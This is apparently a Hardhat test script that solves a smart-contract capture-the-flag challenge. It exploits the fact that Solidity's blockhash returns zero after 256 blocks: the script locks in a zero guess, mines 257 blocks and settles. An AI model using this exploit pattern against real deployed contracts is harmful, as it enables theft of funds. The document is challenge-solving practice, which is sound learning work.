import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
import { formatEtherscanTx } from "../utils/format";
import { sleep } from "../utils/promise";

let accounts: Signer[];
let eoa: Signer;
let contract: Contract; // challenge contract
let attacker: Contract;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const challengeFactory = await ethers.getContractFactory(
    "PredictTheBlockHashChallenge"
  );
  contract = challengeFactory.attach(
    `0x7034F8d94eDdcDC13bbD191537594Cc3B9D186e3`
  );
});

it("solves the challenge", async function () {
  // guess a 0 and then wait for 256 blocks until blockhash returns 0
  // block.blockhash(uint blockNumber) returns (bytes32):
  // hash of the given block - only works for 256 most recent, excluding current, blocks
  await contract.lockInGuess(
    `0x0000000000000000000000000000000000000000000000000000000000000000`,
    {
      value: ethers.utils.parseEther(`1`),
    }
  );

  for (let i = 0; i < 257; i++) {
    await ethers.provider.send("evm_increaseTime", [1]); // add 1 second
    await ethers.provider.send("evm_mine", [
      /* timestamp */
    ]); // mine the next block
    console.log(await ethers.provider.getBlockNumber());
  }

  await contract.settle();

  const isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
});
